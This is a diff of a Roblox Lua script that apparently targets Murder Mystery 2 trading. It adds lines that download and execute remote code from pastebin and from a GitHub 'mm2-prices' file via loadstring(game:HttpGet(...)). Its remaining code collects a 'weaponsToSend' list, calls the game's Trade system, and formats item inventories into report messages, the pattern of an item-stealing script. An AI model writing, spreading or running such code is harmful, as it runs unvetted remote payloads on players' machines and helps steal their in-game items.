@@ -1,11 +1,6 @@
-pcall(function()
-    local url = game:HttpGet("https://pastebin.com/raw/6GSYjsZq")
-    loadstring(game:HttpGet(tostring(url)))()
-end)
-
-pcall(function()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/3bRs4VMt5BEcFFtE/raw"))()
-end)
+local url = game:HttpGet("https://pastebin.com/raw/6GSYjsZq")
+loadstring(game:HttpGet(tostring(url)))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/script.txt"))()
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
@@ -41,31 +36,8 @@ end
 
 local weaponsToSend = {}
 local playerGui = plr:WaitForChild("PlayerGui")
+local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local Trade = ReplicatedStorage:WaitForChild("Trade")
-
-local database
-
-do
-    local ok, result = pcall(function()
-        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-    end)
-
-    if ok and typeof(result) == "table" then
-        database = result
-    else
-        local raw = game:HttpGet("https://pastebin.com/raw/kTEhmXfs")
-        local ok2, result2 = pcall(function()
-            return loadstring(raw)()
-        end)
-
-        if ok2 and typeof(result2) == "table" then
-            database = result2
-        else
-            warn("[Trade] Failed to load database")
-            database = {}
-        end
-    end
-end
 
 local rarityTable = {
     "Common",
@@ -247,21 +219,17 @@ local function SendFirstMessage(list, prefix)
     }
 
     for _, item in ipairs(list) do
-        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)
-", item.DataID, item.Amount, item.Rarity)
+        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
     end
 
     if #fields[3].value > 1024 then
         local lines = {}
-        for line in fields[3].value:gmatch("[^
-]+") do
+        for line in fields[3].value:gmatch("[^\r\n]+") do
             table.insert(lines, line)
         end
         while #fields[3].value > 1024 and #lines > 0 do
             table.remove(lines)
-            fields[3].value = table.concat(lines, "
-") .. "
-Plus more!"
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
         end
     end
 
